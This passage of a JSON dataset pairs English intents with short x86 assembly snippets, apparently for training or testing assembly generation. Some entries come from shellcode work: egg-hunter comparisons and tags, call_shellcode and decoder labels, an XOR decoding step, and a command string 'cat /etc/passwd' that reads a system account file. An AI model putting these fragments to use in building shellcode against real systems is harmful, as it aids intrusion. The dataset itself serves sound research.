    "slot_map": {
      "main": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the me function",
    "rewritten_intent": "call the me function",
    "snippet": "call me",
    "slot_map": {
      "me": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call my_subroutine",
    "rewritten_intent": "call my_subroutine",
    "snippet": "call my_subroutine",
    "slot_map": {
      "my_subroutine": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the near function",
    "rewritten_intent": "call the near function",
    "snippet": "call near stageaddress",
    "slot_map": {
      "near": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0",
      "stageaddress"
    ]
  },
  {
    "intent": "call the one function",
    "rewritten_intent": "call the one function",
    "snippet": "call one",
    "slot_map": {
      "one": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the prepare function",
    "rewritten_intent": "call the prepare function",
    "snippet": "call prepare",
    "slot_map": {
      "prepare": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the quit function",
    "rewritten_intent": "call the quit function",
    "snippet": "call quit",
    "slot_map": {
      "quit": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the set_argv function",
    "rewritten_intent": "call the set_argv function",
    "snippet": "call set_argv",
    "slot_map": {
      "set_argv": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the shell_ret function",
    "rewritten_intent": "call the shell_ret function",
    "snippet": "call shell_ret",
    "slot_map": {
      "shell_ret": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the shellcode function",
    "rewritten_intent": "call the shellcode function",
    "snippet": "call shellcode",
    "slot_map": {},
    "intent_tokens": [
      "call",
      "shellcode",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "shellcode"
    ]
  },
  {
    "intent": "call the sprint function",
    "rewritten_intent": "call the sprint function",
    "snippet": "call sprint",
    "slot_map": {
      "sprint": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the sprintlf function",
    "rewritten_intent": "call the sprintlf function",
    "snippet": "call sprintlf",
    "slot_map": {
      "sprintlf": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the start function",
    "rewritten_intent": "call the start function",
    "snippet": "call start",
    "slot_map": {
      "start": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the strlen function",
    "rewritten_intent": "call the strlen function",
    "snippet": "call strlen",
    "slot_map": {
      "strlen": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the two function",
    "rewritten_intent": "call the two function",
    "snippet": "call two",
    "slot_map": {
      "two": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the write function",
    "rewritten_intent": "call the write function",
    "snippet": "call write",
    "slot_map": {
      "write": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the writestring function",
    "rewritten_intent": "call the writestring function",
    "snippet": "call writestring",
    "slot_map": {
      "writestring": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "define the call_decoded label",
    "rewritten_intent": "define the call_decoded label",
    "snippet": "call_decoded:",
    "slot_map": {
      "call_decoded": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the call_decoder label",
    "rewritten_intent": "define the call_decoder label",
    "snippet": "call_decoder:",
    "slot_map": {
      "call_decoder": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the call_egghunter label",
    "rewritten_intent": "define the call_egghunter label",
    "snippet": "call_egghunter:",
    "slot_map": {
      "call_egghunter": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the call_shellcode label",
    "rewritten_intent": "declare the call_shellcode label",
    "snippet": "call_shellcode:",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the call_shellcode label",
    "rewritten_intent": "define the call_shellcode label",
    "snippet": "call_shellcode:",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the callit label",
    "rewritten_intent": "define the callit label",
    "snippet": "callit:",
    "slot_map": {
      "callit": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the callme label",
    "rewritten_intent": "define the callme label",
    "snippet": "callme:",
    "slot_map": {
      "callme": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the callpop function",
    "rewritten_intent": "define the callpop function",
    "snippet": "callpop:",
    "slot_map": {
      "callpop": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the callpop label",
    "rewritten_intent": "define the callpop label",
    "snippet": "callpop:",
    "slot_map": {
      "callpop": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "clear the edx register",
    "rewritten_intent": "clear the edx register",
    "snippet": "cdq",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "clear",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cdq"
    ]
  },
  {
    "intent": "extend the sign bit of the eax register into the edx register",
    "rewritten_intent": "extend the sign bit of the eax register into the edx register",
    "snippet": "cdq",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "extend",
      "sign",
      "bit",
      "var0",
      "register",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cdq"
    ]
  },
  {
    "intent": "extend the sign bit of eax register into the edx register",
    "rewritten_intent": "extend the sign bit of eax register into the edx register",
    "snippet": "cdq",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "extend",
      "sign",
      "bit",
      "var0",
      "register",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cdq"
    ]
  },
  {
    "intent": "extend the sign bit of eax into the edx register",
    "rewritten_intent": "extend the sign bit of eax into the edx register",
    "snippet": "cdq",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "extend",
      "sign",
      "bit",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cdq"
    ]
  },
  {
    "intent": "define check_even_odd function",
    "rewritten_intent": "define check_even_odd function",
    "snippet": "check_even_odd:",
    "slot_map": {
      "check_even_odd": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the child label",
    "rewritten_intent": "define the child label",
    "snippet": "child:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "child",
      "label"
    ],
    "snippet_tokens": [
      "child",
      ":"
    ]
  },
  {
    "intent": "define chmod_call equal to 15",
    "rewritten_intent": "define chmod_call equal to 15",
    "snippet": "chmod_call equ 15",
    "slot_map": {
      "chmod_call": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "15"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "15"
    ]
  },
  {
    "intent": "define variable choice of 1 byte and initialize to y",
    "rewritten_intent": "define variable choice of 1 byte and initialize to y",
    "snippet": "choice db 'y'",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "variable",
      "choice",
      "1",
      "byte",
      "and",
      "initialize",
      "y"
    ],
    "snippet_tokens": [
      "choice",
      "db",
      "'",
      "y",
      "'"
    ]
  },
  {
    "intent": "set the direction flag to zero",
    "rewritten_intent": "set the direction flag to zero",
    "snippet": "cld",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "direction",
      "flag",
      "zero"
    ],
    "snippet_tokens": [
      "cld"
    ]
  },
  {
    "intent": "direction flag equal to zero",
    "rewritten_intent": "direction flag equal to zero",
    "snippet": "cld",
    "slot_map": {},
    "intent_tokens": [
      "direction",
      "flag",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "cld"
    ]
  },
  {
    "intent": "clear the direction flag",
    "rewritten_intent": "clear the direction flag",
    "snippet": "cld",
    "slot_map": {},
    "intent_tokens": [
      "clear",
      "direction",
      "flag"
    ],
    "snippet_tokens": [
      "cld"
    ]
  },
  {
    "intent": "define close_syscall equal to 6",
    "rewritten_intent": "define close_syscall equal to 6",
    "snippet": "close_syscall equ 6",
    "slot_map": {
      "close_syscall": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "6"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "6"
    ]
  },
  {
    "intent": "define the closefile function",
    "rewritten_intent": "define the closefile function",
    "snippet": "closefile:",
    "slot_map": {
      "closefile": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the closefile label",
    "rewritten_intent": "define the closefile label",
    "snippet": "closefile:",
    "slot_map": {
      "closefile": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define the cmd label",
    "rewritten_intent": "define the cmd label",
    "snippet": "cmd:",
    "slot_map": {
      "cmd": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare cmd string and initialize it to 'cat /etc/passwd'",
    "rewritten_intent": "declare cmd string and initialize it to 'cat /etc/passwd'",
    "snippet": "cmd: db 'cat /etc/passwd'",
    "slot_map": {
      "'cat /etc/passwd'": "var1",
      "cmd": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "string",
      "and",
      "initialize",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "define cmd as the byte string 'cat /etc/passwd'",
    "rewritten_intent": "define cmd as the byte string 'cat /etc/passwd'",
    "snippet": "cmd: db 'cat /etc/passwd'",
    "slot_map": {
      "'cat /etc/passwd'": "var1",
      "cmd": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "byte",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "compare the contents stored at ebp+arg_0 with 1",
    "rewritten_intent": "compare the contents stored at ebp+arg_0 with 1",
    "snippet": "cmp [ebp+arg_0], 1",
    "slot_map": {
      "ebp+arg_0": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "stored",
      "var0",
      "1"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var0",
      "]",
      ",",
      "1"
    ]
  },
  {
    "intent": "compare if the contents at memory location ebp+var_a is 0",
    "rewritten_intent": "compare if the contents at memory location ebp+var_a is 0",
    "snippet": "cmp [ebp+var_a], 0",
    "slot_map": {
      "ebp+var_a": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "contents",
      "memory",
      "location",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var0",
      "]",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare the contents at memory location ebp+var_a with 0",
    "rewritten_intent": "compare the contents at memory location ebp+var_a with 0",
    "snippet": "cmp [ebp+var_a], 0",
    "slot_map": {
      "ebp+var_a": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "memory",
      "location",
      "var0",
      "0"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var0",
      "]",
      ",",
      "0"
    ]
  },
  {
    "intent": "jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero",
    "rewritten_intent": "jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero",
    "snippet": "cmp [ebp+var_a], 0 \\n jnz short loc_4010E5",
    "slot_map": {
      "loc_4010E5": "var0",
      "ebp+var_a": "var2"
    },
    "intent_tokens": [
      "jump",
      "short",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "memory",
      "address",
      "var2",
      "not",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var2",
      "]",
      ",",
      "0",
      "\\n",
      "jnz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5",
    "rewritten_intent": "if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5",
    "snippet": "cmp [ebp+var_a], 0 \\n jnz short loc_4010E5",
    "slot_map": {
      "loc_4010E5": "var1",
      "ebp+var_a": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "memory",
      "address",
      "var0",
      "not",
      "equal",
      "zero",
      "then",
      "jump",
      "short",
      "memory",
      "location",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var0",
      "]",
      ",",
      "0",
      "\\n",
      "jnz",
      "short",
      "var1"
    ]
  },
  {
    "intent": "compare the contents at memory location esi and the contents of the edx register",
    "rewritten_intent": "compare the contents at memory location esi and the contents of the edx register",
    "snippet": "cmp [esi], edx",
    "slot_map": {
      "esi": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "memory",
      "location",
      "var0",
      "and",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the contents at memory location esi with edx",
    "rewritten_intent": "compare the contents at memory location esi with edx",
    "snippet": "cmp [esi], edx",
    "slot_map": {
      "esi": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "memory",
      "location",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack",
    "rewritten_intent": "jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack",
    "snippet": "cmp al, 0x38 \\n je 0x40 \\n push byte 0x1",
    "slot_map": {
      "0x40": "var0",
      "0x38": "var1",
      "0x1": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1",
      "else",
      "push",
      "byte",
      "representation",
      "value",
      "var2",
      "stack"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0",
      "\\n",
      "push",
      "byte",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack",
    "rewritten_intent": "if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack",
    "snippet": "cmp al, 0x38 \\n je 0x40 \\n push byte 0x1",
    "slot_map": {
      "0x38": "var0",
      "0x40": "var1",
      "0x1": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "memory",
      "address",
      "var1",
      "else",
      "push",
      "byte",
      "representation",
      "value",
      "var2",
      "stack"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var1",
      "\\n",
      "push",
      "byte",
      "var2"
    ]
  },
  {
    "intent": "jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register",
    "rewritten_intent": "jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register",
    "snippet": "cmp al, 0xaa \\n je decode_insertion \\n xor al, bl",
    "slot_map": {
      "decode_insertion": "var0",
      "0xaa": "var1",
      "bl": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "vale",
      "var1",
      "else",
      "perform",
      "logical",
      "xor",
      "operation",
      "al",
      "register",
      "and",
      "var3",
      "register",
      "and",
      "store",
      "result",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0",
      "\\n",
      "xor",
      "al",
      ",",
      "var3"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register",
    "rewritten_intent": "if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register",
    "snippet": "cmp al, 0xaa \\n je decode_insertion \\n xor al, bl",
    "slot_map": {
      "decode_insertion": "var2",
      "0xaa": "var0",
      "bl": "var3"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "vale",
      "var0",
      "then",
      "jump",
      "var2",
      "label",
      "else",
      "perform",
      "logical",
      "xor",
      "operation",
      "al",
      "register",
      "and",
      "var3",
      "register",
      "and",
      "store",
      "result",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var2",
      "\\n",
      "xor",
      "al",
      ",",
      "var3"
    ]
  },
  {
    "intent": "compare if the contents of al with 0xf2",
    "rewritten_intent": "compare if the contents of al with 0xf2",
    "snippet": "cmp al, 0xf2",
    "slot_map": {
      "0xf2": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "contents",
      "al",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "compare the contents of the al register and 0xf2",
    "rewritten_intent": "compare the contents of the al register and 0xf2",
    "snippet": "cmp al, 0xf2",
    "slot_map": {
      "0xf2": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "al",
      "register",
      "and",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "compare the contents of the al register with the value 0xf2",
    "rewritten_intent": "compare the contents of the al register with the value 0xf2",
    "snippet": "cmp al, 0xf2",
    "slot_map": {
      "0xf2": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "al",
      "register",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump to the _start label if the contents of the al register is equal to the value 0xf2",
    "rewritten_intent": "jump to the _start label if the contents of the al register is equal to the value 0xf2",
    "snippet": "cmp al, 0xf2 \\n je _start",
    "slot_map": {
      "0xf2": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0xf2 then jump to the _start label",
    "rewritten_intent": "if the contents of the al register is equal to the value 0xf2 then jump to the _start label",
    "snippet": "cmp al, 0xf2 \\n je _start",
    "slot_map": {
      "0xf2": "var0",
      "_start": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var1"
    ]
  },
  {
    "intent": "jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register",
    "rewritten_intent": "jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register",
    "snippet": "cmp al, 0xf2 \\n je _start \\n mov eax, 0x50905090",
    "slot_map": {
      "0xf2": "var1",
      "0x50905090": "var2",
      "_start": "var0",
      "eax": "var4"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1",
      "else",
      "move",
      "value",
      "var2",
      "var4",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0",
      "\\n",
      "mov",
      "var4",
      ",",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register",
    "rewritten_intent": "if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register",
    "snippet": "cmp al, 0xf2 \\n je _start \\n mov eax, 0x50905090",
    "slot_map": {
      "0xf2": "var0",
      "0x50905090": "var2",
      "_start": "var1",
      "eax": "var4"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "var1",
      "label",
      "else",
      "move",
      "value",
      "var2",
      "var4",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var1",
      "\\n",
      "mov",
      "var4",
      ",",
      "var2"
    ]
  },
  {
    "intent": "jump to the fillOnes label if the contents of the al register is equal to the value 0xf2",
    "rewritten_intent": "jump to the fillOnes label if the contents of the al register is equal to the value 0xf2",
    "snippet": "cmp al, 0xf2 \\n je fillOnes",
    "slot_map": {
      "fillOnes": "var0",
      "0xf2": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label",
    "rewritten_intent": "if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label",
    "snippet": "cmp al, 0xf2 \\n je fillOnes",
    "slot_map": {
      "fillOnes": "var1",
      "0xf2": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var1"
    ]
  },
  {
    "intent": "jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register",
    "rewritten_intent": "jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register",
    "snippet": "cmp al, 0xf2 \\n je fillOnes \\n mov eax, 0x59935193",
    "slot_map": {
      "fillOnes": "var0",
      "0xf2": "var1",
      "0x59935193": "var2",
      "eax": "var4"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "var1",
      "else",
      "move",
      "value",
      "var2",
      "var4",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0",
      "\\n",
      "mov",
      "var4",
      ",",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register",
    "rewritten_intent": "if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register",
    "snippet": "cmp al, 0xf2 \\n je fillOnes \\n mov eax, 0x59935193",
    "slot_map": {
      "fillOnes": "var1",
      "0xf2": "var0",
      "0x59935193": "var2",
      "eax": "var4"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "var0",
      "then",
      "jump",
      "var1",
      "label",
      "else",
      "move",
      "value",
      "var2",
      "var4",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var1",
      "\\n",
      "mov",
      "var4",
      ",",
      "var2"
    ]
  },
  {
    "intent": "jump to the label next_page if the contents of the al register is equal to the value 0xf2",
    "rewritten_intent": "jump to the label next_page if the contents of the al register is equal to the value 0xf2",
    "snippet": "cmp al, 0xf2 \\n je next_page",
    "slot_map": {
      "next_page": "var0",
      "0xf2": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0xf2 then jump to the label next_page",
    "rewritten_intent": "if the contents of the al register is equal to the value 0xf2 then jump to the label next_page",
    "snippet": "cmp al, 0xf2 \\n je next_page",
    "slot_map": {
      "next_page": "var1",
      "0xf2": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "je",
      "var1"
    ]
  },
  {
    "intent": "jump to the _start label if the contents of the al register is equal to the value 0xf2",
    "rewritten_intent": "jump to the _start label if the contents of the al register is equal to the value 0xf2",
    "snippet": "cmp al, 0xf2 \\n jz _start",
    "slot_map": {
      "0xf2": "var1",
      "_start": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0xf2 then jump to the _start label",
    "rewritten_intent": "if the contents of the al register is equal to the value 0xf2 then jump to the _start label",
    "snippet": "cmp al, 0xf2 \\n jz _start",
    "slot_map": {
      "0xf2": "var0",
      "_start": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "if the contents of the al register is equal to the value 0xf2 then jump to the incpage label",
    "rewritten_intent": "if the contents of the al register is equal to the value 0xf2 then jump to the incpage label",
    "snippet": "cmp al, 0xf2 \\n jz incpage",
    "slot_map": {
      "0xf2": "var0",
      "incpage": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var0",
      "then",
      "jump",
      "var1",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "jump to the incpage label if the contents of the al register is equal to the value 0xf2",
    "rewritten_intent": "jump to the incpage label if the contents of the al register is equal to the value 0xf2",
    "snippet": "cmp al, 0xf2 \\n jz incpage",
    "slot_map": {
      "0xf2": "var1",
      "incpage": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "al",
      "register",
      "equal",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "jump to the label l1 if the contents of the al register is greater than the decimal value 9",
    "rewritten_intent": "jump to the label l1 if the contents of the al register is greater than the decimal value 9",
    "snippet": "cmp al, 9 \\n jg l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "al",
      "register",
      "greater",
      "decimal",
      "value",
      "9"
    ],
    "snippet_tokens": [
      "cmp",
      "al",
      ",",
      "9",
      "\\n",
      "jg",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is greater than the decimal value 9 then jump to the label l1",
    "rewritten_intent": "if the contents of the al register is greater than the decimal value 9 then jump to the label l1",
    "snippet": "cmp al, 9 \\n jg l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "greater",
      "decimal",
      "value",
